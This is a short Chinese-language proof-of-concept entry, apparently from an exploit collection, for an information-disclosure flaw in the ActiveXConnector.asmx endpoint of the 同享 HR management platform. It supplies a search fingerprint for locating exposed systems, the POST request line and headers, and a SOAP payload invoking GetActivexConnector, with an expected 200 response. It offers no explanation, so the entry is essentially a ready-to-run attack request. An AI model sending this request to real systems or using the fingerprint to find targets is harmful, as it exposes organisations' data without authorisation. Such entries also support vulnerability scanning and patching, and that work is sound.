# 同享人力管理管理平台ActiveXConnector.asmx信息泄露漏洞

- **系统**：同享人力管理管理平台ActiveXConnector.asmx　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="/Assistant/Default.aspx"`
- **请求**：`POST /Service/ActiveXConnector.asmx HTTP/1.1`
- **关键头**：`Priority: u=0, i`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 224`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetActivexConnector/>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—